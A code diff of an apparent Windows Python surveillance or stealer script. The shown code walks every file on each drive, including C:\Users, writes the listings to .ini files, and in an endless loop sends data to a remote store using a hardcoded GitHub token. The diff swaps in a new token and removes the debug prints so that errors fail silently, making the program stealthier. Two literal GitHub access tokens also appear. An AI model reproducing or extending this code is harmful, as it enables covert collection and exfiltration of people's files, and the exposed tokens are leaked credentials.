@@ -13,7 +13,7 @@ import win32api
 import zipfile
 
 # _____(end import)_____ #
-TOKEN = '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'
+TOKEN = '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'
 chdir(getcwd())
 # _____(function)_____ #
 try:
@@ -144,7 +144,6 @@ while True:
                 drives = drives.split('\000')[:-1]
                 for i in drives:
                     if i == "C:\\": i = i + "Users"
-                    print(i)
                     with open(f"path\\{list(i)[0]}.ini", mode="w+", encoding="utf8") as f:
                         for root, dirs, files in walk(i):
                             for file in files:
@@ -189,7 +188,6 @@ while True:
             else:
                 send_main_information(TOKEN=TOKEN, content=str(datetime.now()),name_file_to_site="last_visit.ini") # last_visit(TOKEN)
                 sleep(300)
-    except Exception as e:
-        print(e)
+    except:
         sleep(5)
         continue
